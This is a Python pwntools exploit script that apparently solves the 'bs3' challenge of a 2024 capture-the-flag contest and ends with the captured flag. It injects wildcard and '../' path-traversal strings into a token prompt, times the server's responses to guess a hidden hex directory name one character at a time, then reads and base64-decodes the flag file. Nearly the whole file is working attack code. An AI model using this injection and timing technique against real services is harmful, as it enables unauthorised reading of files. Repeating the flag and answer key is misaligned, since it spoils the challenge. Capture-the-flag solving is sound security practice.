#!/usr/bin/env python3

from pwn import *
import time
import base64

p64 = lambda x: util.packing.p64(x, endian='little')
u64 = lambda x: util.packing.u64(x, endian='little')
p32 = lambda x: util.packing.p32(x, endian='little')
u32 = lambda x: util.packing.u32(x, endian='little')


context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']


def conn():
	if args.REMOTE:
		r = remote("bs3.challs.external.open.ecsc2024.it", 38315)
	else:
		r = process('./server.bash')
	return r

r = conn()


def main():
	hexchars = b'0123456789abcdef'
	bucket = b''
	for i in range(16):
		for char in hexchars:
			tmp_name = bucket + char.to_bytes(1, 'big')
			print(tmp_name.decode())
			tmp = tmp_name + b'*/' + b'../' * 10 + b'*/*/'
			r.sendlineafter(b'4. Exit\n', b'3')
			start = time.time()
			r.sendlineafter(b'Enter token:', tmp)
			r.sendlineafter(b'Enter file name:', b'/')
			r.recvline()
			end = time.time()
			diff = end - start
			if diff > 1:
				bucket = tmp_name
				break
		else:
			print('Fail')
			exit()

	print(bucket.decode() + '/flag')
	r.sendlineafter(b'4. Exit\n', b'3')
	r.sendlineafter(b'Enter token:', bucket)
	r.sendlineafter(b'Enter file name:', b'flag')
	enc_flag = r.recvline().strip().decode()
	flag = base64.b64decode(enc_flag)
	print(flag)

	r.interactive()


if __name__ == "__main__":
	main()

# TeamItaly{wh4n_1n_d0ubt_just_4dd_qu073s_f393af2a}
